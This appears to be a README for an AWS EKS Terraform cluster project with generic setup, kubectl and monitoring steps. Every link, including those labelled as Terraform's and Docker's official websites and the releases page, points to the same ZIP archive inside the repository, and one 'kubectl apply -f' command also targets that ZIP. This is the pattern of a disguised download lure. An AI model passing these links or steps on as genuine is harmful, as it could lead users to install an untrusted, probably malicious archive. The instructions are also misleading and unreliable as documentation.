## üìù Overview

The `aws-eks-ent-multi-az-cluster` project provides a robust, enterprise-grade AWS EKS cluster. This solution combines high availability, advanced security, and effective monitoring features. It's designed for production workloads, ensuring that your applications run smoothly and securely in the cloud.

## üöÄ Getting Started

Follow these simple steps to download and set up the application on your device. 

### ‚úÖ Prerequisites

Before you start, ensure you have the following:

- **Operating System:** This application works on modern operating systems like Windows, macOS, and Linux.
- **AWS Account:** You will need an Amazon Web Services account to deploy the EKS cluster.
- **Basic AWS Knowledge:** Familiarity with AWS concepts will help you navigate the setup process.
- **Terraform Installed:** Make sure you have [Terraform](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip) installed on your machine. This tool helps automate the setup.

### üì• Download & Install

Visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip). 

Once on the page:

1. Look for the latest release.
2. Select the appropriate file for your operating system.
3. Download the file to your computer.

### üõ†Ô∏è Setup Instructions

After downloading the necessary files, follow these steps:

1. **Extract the Files:**
   - Locate the downloaded ZIP file or archive.
   - Extract its contents to a folder on your computer.

2. **Install Dependencies:**
   - Ensure that you have Docker installed. You can download it from [Docker's official website](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip).
   - Depending on your operating system, install necessary packages as indicated in the documentation.

3. **Configure AWS Credentials:**
   - Set up your AWS credentials by creating a file named `credentials` in the `.aws` directory of your user home folder.
   - The file should look like this:

     ```
     [default]
     aws_access_key_id = YOUR_ACCESS_KEY
     aws_secret_access_key = YOUR_SECRET_KEY
     ```

4. **Run Terraform:**
   - Open your command line interface (CLI).
   - Navigate to the folder where you extracted the files.
   - Execute the following command to initialize Terraform:

     ```
     terraform init
     ```

   - Then, apply the configuration using:

     ```
     terraform apply
     ```

   - Review the output and confirm the action. This sets up your EKS cluster.

5. **Verify the Setup:**
   - After the Terraform process completes, use the AWS Management Console to verify that your EKS cluster is running.

### üîç Usage

With your EKS cluster set up, you can now deploy and manage your applications in a highly available environment. Use Kubernetes commands to interact with your cluster:

- **Check Cluster Status:**
  - Run the following command in your terminal:

    ```
    kubectl cluster-info
    ```

- **Deploy Applications:**
  - Create a Kubernetes deployment by producing a YAML file and applying it with:

    ```
    kubectl apply -f https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip
    ```

### üìä Monitoring the Cluster

Utilize AWS CloudWatch for monitoring:

- Set up alarms for CPU and memory usage.
- Review logs and troubleshoot issues.

### üîí Security Features

This EKS cluster is equipped with advanced security features, including:

- IAM roles for fine-grained permissions.
- Network policies to control access.

### ‚òÅÔ∏è Price Management

Using AWS EKS helps in managing costs efficiently. Monitor your resources via the AWS Management Console. Adjust the number of nodes as needed to scale your applications.

### ‚ÑπÔ∏è Troubleshooting
